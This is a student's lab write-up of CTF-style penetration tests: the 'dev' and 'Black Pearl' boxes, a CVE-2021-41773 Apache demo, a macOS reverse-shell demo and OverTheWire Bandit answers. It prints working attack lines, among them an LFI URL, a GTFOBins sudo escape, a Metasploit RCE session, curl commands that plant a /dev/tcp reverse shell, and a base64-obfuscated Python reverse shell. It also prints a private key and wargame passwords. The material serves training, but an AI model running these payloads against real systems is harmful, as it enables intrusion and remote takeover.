 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 104 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```



![](IMG/AT3C3_Sec_img_16.png)

now fuzzing `/dev`
```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.1.1.34:8080/dev/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.1.34:8080/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
config                  [Status: 301, Size: 318, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 4]
files                   [Status: 301, Size: 317, Words: 20, Lines: 10]
forms                   [Status: 301, Size: 317, Words: 20, Lines: 10]
pages                   [Status: 301, Size: 317, Words: 20, Lines: 10]
stamps                  [Status: 301, Size: 318, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
       
```

Again, I found the same password : http://10.1.1.34:8080/dev/pages/member.admin

```terminal {title="bash"}
~data~
password: I_love_java
~
```

If I try to login as admin with this password, it works : \
http://192.168.20.21:8080/dev/index.php?p=welcome&action=login

Member : `Admin` \
Password : `I_love_java`

![](IMG/AT3C3_Sec_img_19.png)

Once logged, I can see that this is using BoltWire version 6.03, [which can be exploited](https://www.exploit-db.com/exploits/48411)

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ searchsploit boltwire                                                                                                                                                                                  1 ⚙
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                  | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                                                                                         | php/webapps/48411.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

POC : `http://192.168.20.21:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd`

![](IMG/AT3C3_Sec_img_20.png)

There's an user named : `jeanpaul` \

<br>

exploiting NFS Share, port  **2049**

https://resources.infosecinstitute.com/topic/exploiting-nfs-share/

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[/dev]
└─$ showmount -e 192.168.20.21                                                                                                                                                                             1 ⚙
Export list for 192.168.20.21:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

┌──(user㉿kaliCEF98)-[~]
└─$ sudo mount -t nfs 192.168.20.21:/srv/nfs /tmp/dev                                                                                                                                                      1 ⚙
                                                                                                                                                                                                               
┌──(user㉿kaliCEF98)-[~]
└─$ cd /tmp/dev                                                                                                                                                                                            1 ⚙
                                                                                                                                                                                                               
┌──(user㉿kaliCEF98)-[/tmp/dev]
└─$ ls                                                                                                                                                                                                     1 ⚙
save.zip

┌──(user㉿kaliCEF98)-[/tmp/dev]
└─$ unzip save.zip                                                                                                                                                                                   130 ⨯ 1 ⚙
Archive:  save.zip
[save.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password
   skipping: todo.txt                incorrect password
         
```

the archive is password protected, `I_love_java` is not working so I need to crack it.

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ sudo zip2john save.zip > hashzip
Created directory: /root/.john
ver 2.0 efh 5455 efh 7875 save.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1435, decmplen=1876, crc=15E468E2
ver 2.0 efh 5455 efh 7875 save.zip/todo.txt PKZIP Encr: 2b chk, TS_chk, cmplen=138, decmplen=164, crc=837FAA9E
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                                                                                                                                                                                                                                                       
┌──(user㉿kaliCEF98)-[~]
└─$ cat hashzip
save.zip:$pkzip2$2*2*1*0*8*24*15e4*2a0d*fa2fd40a19c9abbcb3b68f36c7408290b667892909fe2a69a375691c081567b216099286*2*0*8a*a4*837faa9e*5eb*42*8*8a*837f*2aa1*b677b6989f72ee6f3e50d638fcedfc42508d4f87903a6edc960ab38f2c8795ce11b818da9f5723ca1ac08e5c4ff76699bbd1a3c4307a1c97971cce7bb8a5be88359a6a20b4e5a7417558ac38cd45bc32b97ff8d3fc671c4b97fb17011bdcfa702d5b0d7d88b63a6ea62e5e7fd06ca4f8309e9cbd637aff0de5d564e81ec472e9b457baf2c71d5c6d7ae9*$/pkzip2$::save.zip:todo.txt, id_rsa:save.zip

┌──(user㉿kaliCEF98)-[~]
└─$ john hashzip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
java101          (save.zip)
1g 0:00:00:20 DONE 3/3 (2021-10-21 11:55) 0.04967g/s 1666Kp/s 1666Kc/s 1666KC/s bbs1700..javona1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                                                               
┌──(user㉿kaliCEF98)-[~]
└─$ john hashzip --show
save.zip:java101::save.zip:todo.txt, id_rsa:save.zip

1 password hash cracked, 0 left
     
```

Zip password : `java101`

in the archive there's 2 files : `todo.txt` and `id_rsa`

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/devVM]
└─$ cat todo.txt 
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
                                                                                                                                                                                                               
┌──(user㉿kaliCEF98)-[~/devVM]
└─$ cat id_rsa      
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
-----END OPENSSH PRIVATE KEY-----
```

So I have a ssh private key, and a note signed by `JP`, probably JeanPaul. \
Let's try to SSH with either of the password we already found.

The first one is working \
user : `jeanpaul` \
passphrase: `I_love_java`

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/devVM]
└─$ ssh -i id_rsa jeanpaul@192.168.20.21                                                                                                                                                                 130 ⨯
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct 21 07:37:03 2021 from 192.168.20.168
jeanpaul@dev:~$ id
uid=1000(jeanpaul) gid=1000(jeanpaul) groups=1000(jeanpaul),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

<br>

**ROOT**



```terminal {title="bash"}
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```

looks like jeanpaul can use `/usr/bin/zip` as sudo without password. \
let's check GTFOBins : https://gtfobins.github.io/gtfobins/zip/#sudo

```terminal {title="bash"}
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# ls  
# cd /root
# ls
flag.txt
# cat flag.txt	
Congratz on rooting this box !
# 
```

---

<br>

## Machine - Black Pearl


Initial scan
```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nmap -A -Pn 10.1.1.35
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:36 CEST
Nmap scan report for 10.1.1.35
Host is up (0.0018s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
```

fuzzing
```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ gobuster dir -u http://10.1.1.35 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.1.35
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/20 15:37:35 Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 200) [Size: 209]
                                               
===============================================================
2021/10/20 15:37:37 Finished
===============================================================
```

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ curl http://10.1.1.35/secret
OMG you got r00t !


Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 
```

good one 😐

Even if on port 80 we have the default nginx html page, the source code reveal someting interesting

![](IMG/AT3C3_Sec_img_11.png)

*changing my host file*

![](IMG/AT3C3_Sec_img_35.png)

So now when I go to http://blackpearl.tcm I can see a php.info page

![](IMG/AT3C3_Sec_img_12.png)

redoing the fuzz scan but with the `blackpearl.tcm` instead

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://blackpearl.tcm/FUZZ                                                                             1 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://blackpearl.tcm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 169, Words: 4, Lines: 8]
.htaccess               [Status: 403, Size: 169, Words: 4, Lines: 8]
navigate                [Status: 301, Size: 185, Words: 6, Lines: 8]
:: Progress: [20469/20469] :: Job [1/1] :: 11140 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
   
```

This time, it found a CMS

![](IMG/AT3C3_Sec_img_13.png)

Bottom right corner, we can see the version : **v2.8** \
An exploit can also be found very quickly : \
https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/

```terminal {title="bash"}
msf6 > use exploit/multi/http/navigate_cms_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.1.19        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS 10.1.1.35
RHOSTS => 10.1.1.35
msf6 exploit(multi/http/navigate_cms_rce) > set VHOST blackpearl.tcm
VHOST => blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > exploit

[*] Started reverse TCP handler on 10.1.1.19:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39282 bytes) to 10.1.1.35
[*] Meterpreter session 1 opened (10.1.1.19:4444 -> 10.1.1.35:51068 ) at 2021-10-20 19:13:50 +0200

meterpreter > shell
Process 662 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash -i
bash: cannot set terminal process group (477): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blackpearl:~/blackpearl.tcm/navigate$ 
```

<br>

**User**

running [LinPEAS](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh) : 

 ![](IMG/AT3C3_Sec_img_14.png)
 
 the SUID bit is set for `/usr/bin/php7.3`
 
 GTFObins to the rescue again : https://gtfobins.github.io/gtfobins/php/#suid
 
```terminal {title="bash"}
www-data@blackpearl:~/blackpearl.tcm/navigate$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
</usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cd /root
ls
flag.txt
cat flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
```

still  are `www-data` but with euid root so we can read the flag.

<br>

---

# Demo - CVE-2021-41773 Apache path traversal


During this week CVE-2021-41773, about Apache2  path traversal exploit, was released. \
So we played a little bit with with it.

I completely forgot to take screenshots here, but there's a quick and simple tryhackme room for for it : https://tryhackme.com/room/cve202141773

But I saved those few lines provided by eux (thx) to exploit it easily.

```terminal {title="bash"}
curl 'http://192.168.20.170//cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo; echo "#!/bin/bash" > /tmp/SCRIPT.sh'
curl 'http://192.168.20.170//cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo; echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> /tmp/SCRIPT.sh'
curl 'http://192.168.20.170//cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo; bash /tmp/SCRIPT.sh'
```

I'll update this post when I have time. 

>Fun fact
>
>Ever since starting at CEFIM, every time we had to use Apache with dedicated vhost we learned (wrongly) that we needed to comment (see screenshot below) a few lines in `apache2.conf` to make it work, otherwise you get a 403.
>
>![](IMG/AT3C3_Sec_img_73.png)
>
>Well, a few weeks before CVE-2021-41773 was released, I got curious and looked at the some of the Apache2 security documentation https://httpd.apache.org/docs/2.4/en/misc/security_tips.html \
>Where I saw this intersting bit : 
>
>![](IMG/AT3C3_Sec_img_74.png)
>
>Before sharing my discovery on our discord server I wanted to see if I could make it "work". So I started playing arround, but to no avail.
>
>I googled it and found a stackoverflow post (sorry can't find the link anymore) stating that since it was not a default configuration and possibly a huge security hole, the path traversal was not possible. 
>
>so I posted on disord anyway. \
>![](IMG/AT3C3_Sec_img_75.png)
>
>Then I saw the new hot CVE in town : [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) for Apache HTTP Server 2.4.49  \
>![](IMG/AT3C3_Sec_img_77.png)
>
>And wow, it was the exact same thing I tested.
>
>I couldn't make it work back then because 2.4.49 was released on [September 16th](https://www.apachelounge.com/Changelog-2.4.html) and I did my test on the 14th. 🤦‍♂️


<br>

---

# Demo - Get a shell on MacOS


Just a little demo, again thank you euz for the python snippet.

In one side I'll have a listener on Kali

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ nc -nvlp 9999         
listening on [any] 9999 ...
```

on the other side (on MacOS), I'll run the following code. \
I don't need to install anything since python a natively installed on MacOS.

```python
python3 -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('CmltcG9ydCBzb2NrZXQsemxpYixiYXNlNjQsc3RydWN0LHRpbWUsb3MscHR5CmZvciB4IGluIHJhbmdlKDEwKToKCXRyeToKCQlzPXNvY2tldC5zb2NrZXQoMixzb2NrZXQuU09DS19TVFJFQU0pCgkJcy5jb25uZWN0KCgnMTAuMS4xLjE5Jyw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQ==')[0]))"
```

![](IMG/AT3C3_Sec_img_78.png)

Back on Kali we can see

![](IMG/AT3C3_Sec_img_81.png)

(Yes, it's a Monterey VM)

<br>

Here's the decoded base64 part : 

![](IMG/AT3C3_Sec_img_82.png)

here is it in [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=CmltcG9ydCBzb2NrZXQsemxpYixiYXNlNjQsc3RydWN0LHRpbWUsb3MscHR5CmZvciB4IGluIHJhbmdlKDEwKToKCXRyeToKCQlzPXNvY2tldC5zb2NrZXQoMixzb2NrZXQuU09DS19TVFJFQU0pCgkJcy5jb25uZWN0KCgnMTAuMS4xLjE5Jyw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQ) if you want to play.

```python
python3 -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('BASE64CODEHERE)[0]))"
```

<br>

---

# Wargames overthewire - Bandit


For those who want to try something other than rooting a box, there's : https://overthewire.org/wargames/ \
I only got up to level 25 during this week. Maybe I'll come back to it later.


<details>
 <summary>Level 0</summary>

`ssh bandit0@bandit.labs.overthewire.org -p 2220` \ pwd `bandit0`

</details>


<details>
 <summary>Level 0 → Level 1</summary>  

```terminal {title="bash"}
bandit0@bandit:~$ cat /home/bandit0/readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```	

`ssh bandit1@bandit.labs.overthewire.org -p 2220`  | pwd : `boJ9jbbUNNfktd78OOpsqOltutMc3MY1`
	
</details>


<details>
 <summary>Level 1 → Level 2</summary>

```terminal {title="bash"}
bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

`ssh bandit2@bandit.labs.overthewire.org -p 2220`  | pwd : `CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9`

</details>


<details>
 <summary>Level 2 → Level 3</summary>

```terminal {title="bash"}
bandit2@bandit:~$ cat spaces*
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```
or
```terminal {title="bash"}
bandit2@bandit:~$ cat 'spaces in this filename'
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

`ssh bandit3@bandit.labs.overthewire.org -p 2220`  | pwd : `UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK`
	
</details>


<details>
 <summary>Level 3 → Level 4</summary>

```terminal {title="bash"}
bandit3@bandit:~$ ls -la inhere/
total 12
drwxr-xr-x 2 root    root    4096 May  7  2020 .
drwxr-xr-x 3 root    root    4096 May  7  2020 ..
-rw-r----- 1 bandit4 bandit3   33 May  7  2020 .hidden
bandit3@bandit:~$ cat inhere/.hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

`ssh bandit4@bandit.labs.overthewire.org -p 2220`  | pwd : `pIwrPrtPN36QITSp3EQaw936yaFoFgAB`

</details>


<details>
 <summary>Level 4 → Level 5</summary>  

```terminal {title="bash"}
bandit4@bandit:~$ file inhere/-file*
inhere/-file00: data
inhere/-file01: data
inhere/-file02: data
inhere/-file03: data
inhere/-file04: data
inhere/-file05: data
inhere/-file06: data
inhere/-file07: ASCII text
inhere/-file08: data
inhere/-file09: data
bandit4@bandit:~$ cat inhere/-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

`ssh bandit5@bandit.labs.overthewire.org -p 2220`  | pwd : `koReBOKuIDDepwhWk7jZC0RTdopnAYKh`


</details>

<details>
 <summary>Level 5 → Level 6</summary> 

```terminal {title="bash"}
bandit5@bandit:~$ find inhere/* -size 1033c
inhere/maybehere07/.file2

bandit5@bandit:~$ cat inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

`ssh bandit6@bandit.labs.overthewire.org -p 2220`  | pwd : `DXjZPULLxYr17uwoI01bNLQbtFemEgo7`

</details>


<details>
 <summary>Level 6 → Level 7</summary>

```terminal {title="bash"}
bandit6@bandit:~$ find /* -size 33c -user bandit7 -group bandit6
[...]
/var/lib/dpkg/info/bandit7.password
[...]

bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

`ssh bandit7@bandit.labs.overthewire.org -p 2220`  | pwd : `HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs`

</details>


<details>
 <summary>Level 7 → Level 8</summary>

```terminal {title="bash"}
bandit7@bandit:~$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

`ssh bandit8@bandit.labs.overthewire.org -p 2220`  | pwd : `cvX2JJa4CFALtqS87jk27qwqGhBM9plV`

</details>


<details>
 <summary>Level 8 → Level 9</summary>
	

```terminal {title="bash"}
bandit8@bandit:~$ strings data.txt | sort | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

`ssh bandit9@bandit.labs.overthewire.org -p 2220`  | pwd : `UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR`

</details>

<details>
 <summary>Level 9 → Level 10</summary>

```terminal {title="bash"}
bandit9@bandit:~$ strings data.txt | grep "=="
========== the*2i"4
========== password
Z)========== is
&========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```

`ssh bandit10@bandit.labs.overthewire.org -p 2220`  | pwd : `truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk`

</details>


<details>
 <summary>Level 10 → Level 11</summary>

```terminal {title="bash"}
bandit10@bandit:~$ strings data.txt
VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==
bandit10@bandit:~$ strings data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

`ssh bandit11@bandit.labs.overthewire.org -p 2220`  | pwd : `IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR`

</details>


<details>
 <summary>Level 11 → Level 12</summary>
 

```terminal {title="bash"}
bandit11@bandit:~$ strings data.txt
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh

bandit11@bandit:~$ strings data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
or with cyberChef : https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=R3VyIGNuZmZqYmVxIHZmIDVHcjhMNHFldFBFc1BrOGh0cWpoUks4WFNQNngyUkho

`ssh bandit12@bandit.labs.overthewire.org -p 2220`  | pwd : `5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu`

</details>


<details>
 <summary>Level 12 → Level 13</summary>

```terminal {title="bash"}
bandit12@bandit:/tmp/wem$ xxd -r data.txt data_output
bandit12@bandit:/tmp/wem$ file data_output
data_output: gzip compressed data, was "data2.bin", last modified: Thu May  7 18:14:30 2020, max compression, from Unix
